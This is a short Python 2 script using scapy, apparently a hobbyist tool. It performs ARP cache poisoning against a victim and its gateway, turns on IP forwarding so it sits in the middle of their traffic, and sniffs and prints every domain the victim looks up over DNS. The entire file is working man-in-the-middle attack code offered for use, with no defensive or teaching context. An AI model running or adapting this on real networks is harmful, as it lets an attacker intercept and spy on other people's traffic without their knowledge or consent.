# -*- coding: utf-8 -*-
# requred scapy
#
# [scapy installing (UNIX)]
# wget scapy.net
# unzip scapy-latest.zip
# cd scapy-2.*
# sudo python setup.py install
#
# Python version 2.7.6
# Author: Carlo Cervellin
# Version 0.1

from scapy.all import *
import threading
import os
import sys

V_IP = raw_input("Insert the IP to attack: ")
GW_IP = raw_input("Insert the gateway IP: ")
INTERFACE = raw_input("Insert the network interface name: ")

print("poisoning...")

#enable IP forwarding
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

#capturing and displaying dns traffic
def dnshandle(pkt):
	if pkt.getlayer(IP).src==V_IP and pkt.haslayer(DNS) and pkt.getlayer(DNS).qr==0 :
		print("Victim: "+V_IP+" is resolving "+pkt.getlayer(DNS).qd.qname)
		#print("DNS traffic from: "+pkt.getlayer(IP).src+" to: "+pkt.getlayer(IP).dst+" for resolving: "+pkt.getlayer(DNS).qd.qname)

#victim poisoning
def v_poison():
	v = ARP(psrc=GW_IP, pdst=V_IP)
	while True :
		try :
			send(v,verbose=0,inter=1,loop=1)
		except KeyboardInterrupt :
			sys.exit(1)

#gateway poisoning
def gw_poison() :
	v = ARP(psrc=V_IP, pdst=GW_IP)
	while True :
		try :
			send(v,verbose=0,inter=1,loop=1)
		except KeyboardInterrupt :
			sys.exit(1)

vthread = []
gwthread = []

while True :

	vpoison = threading.Thread(target=v_poison)
	vpoison.setDaemon(True)
	vthread.append(vpoison)
	vpoison.start()

	gwpoison = threading.Thread(target=gw_poison)
	gwpoison.setDaemon(True)
	gwthread.append(gwpoison)
	gwpoison.start()

	pkt = sniff(iface=INTERFACE, filter='udp port 53', prn=dnshandle)


